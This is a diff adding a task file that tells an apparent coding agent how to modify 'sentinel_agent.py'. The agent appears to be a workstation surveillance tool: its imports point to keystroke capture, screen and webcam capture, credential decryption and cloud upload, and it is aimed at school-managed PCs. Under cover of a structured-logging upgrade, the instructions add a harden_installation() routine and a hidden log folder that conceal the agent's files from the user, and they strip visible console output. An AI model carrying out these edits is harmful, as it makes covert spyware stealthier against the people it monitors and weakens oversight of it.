@@ -1,0 +1,107 @@
+Target File: sentinel_agent.py
+Objective: Upgrade the agent to use enterprise structured JSON logging (structlog), remove all stdout print() statements, inject a BuildInfo banner, and add a harden_installation() routine.
+
+Execute the following exact modifications:
+
+Task 1: Add Dependencies
+In the try...except ImportError block near the top (around line 52), add structlog to the imports and the error message:
+
+Python
+try:
+    from supabase import create_client, Client
+    import win32crypt
+    import cv2
+    from PIL import ImageGrab
+    from pynput import keyboard
+    import structlog
+except ImportError:
+    sys.exit("Install dependencies: pip install supabase psutil pillow pynput opencv-python pywin32 structlog")
+Task 2: Inject the Logger & Setup Function
+Immediately after the try/except import block, inject this corrected structlog setup:
+
+Python
+# --- ENTERPRISE LOGGING ---
+def setup_structlog():
+    log_dir = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'Obylon', 'logs')
+    os.makedirs(log_dir, exist_ok=True)
+    log_path = os.path.join(log_dir, 'nexus_sentinel.log')
+    
+    try:
+        import ctypes
+        ctypes.windll.kernel32.SetFileAttributesW(log_dir, 2)
+    except Exception:
+        pass
+
+    log_file = open(log_path, "a", encoding="utf-8")
+    
+    structlog.configure(
+        processors=[
+            structlog.processors.add_log_level,
+            structlog.processors.TimeStamper(fmt="%Y-%m-%d %H:%M:%S", utc=False),
+            structlog.processors.JSONRenderer(),
+        ],
+        logger_factory=structlog.WriteLoggerFactory(file=log_file),
+        wrapper_class=structlog.make_filtering_bound_logger(0),
+    )
+    return structlog.get_logger("obylon_agent")
+
+logger = setup_structlog()
+Task 3: Inject BuildInfo and Hardening Functions
+Place these immediately before the main() function:
+
+Python
+class BuildInfo:
+    VERSION = "6.3.5-LTS"
+    BUILD_DATE = "2026-06-01"
+    COMMIT = "monolith-stable"
+
+    @staticmethod
+    def print_banner():
+        logger.info(f"=== OBYLON SENTINEL v{BuildInfo.VERSION} (LTS) ===", component="boot")
+        logger.info("Build Details", build_date=BuildInfo.BUILD_DATE, commit=BuildInfo.COMMIT, component="boot")
+        logger.info("Deployment target: School-managed Windows workstations", component="boot")
+        logger.info("All evidence only on confirmed policy violation. Authorized IT use only.", component="boot")
+
+def harden_installation():
+    """Hide everything important from casual snooping."""
+    paths_to_hide = [
+        VAULT_DB,
+        CACHE_DIR,
+        Path(os.environ.get('PROGRAMDATA', 'C:\\ProgramData')) / "Obylon",
+        Path.home() / ".sentinel_alias",
+        Path.home() / ".sentinel_id",
+    ]
+    for p in paths_to_hide:
+        if p.exists():
+            _hide_path(p)
+    logger.info("Self-protection: critical paths hidden from explorer", component="startup")
+Task 4: Update main()
+Inside def main() -> None:, completely DELETE the massive 20-line print(...) block with the ASCII art and the boot messages.
+Replace it with this:
+
+Python
+def main() -> None:
+    BuildInfo.print_banner()
+    harden_installation()
+Task 5: Search and Replace ALL print() Statements
+Traverse the entire sentinel_agent.py file and replace every single print() statement with structured logging.
+Rule 1: Use logger.info() for standard operational messages.
+Rule 2: Use logger.warning() for enforcement/strikes (e.g., Wardon locks).
+Rule 3: Use logger.error(..., exc_info=True) for exception handling and stderr.
+Rule 4: Extract string interpolation variables into kwargs where possible.
+
+Examples to follow:
+
+Replace print(f"[vault] queued {kind}/{table_name} id={event_id} ts={created_at}")
+WITH: logger.info("queued event", component="vault", kind=kind, table_name=table_name, event_id=event_id, ts=created_at)
+
+Replace print("[guard] Tactical Monolith Deployed - Input Severed")
+WITH: logger.warning("Tactical Monolith Deployed - Input Severed", component="warden", locked=True)
+
+Replace print(f"[sync] surge complete: {wins}/{len(pending)} cleared")
+WITH: logger.info("Surge complete", component="sync", wins=wins, total=len(pending))
+
+Replace print(f"[vault] init failed: {e}", file=sys.stderr)
+WITH: logger.error("Vault init failed", component="vault", error=str(e), exc_info=True)
+
+Execute the replacement across the entire file now.
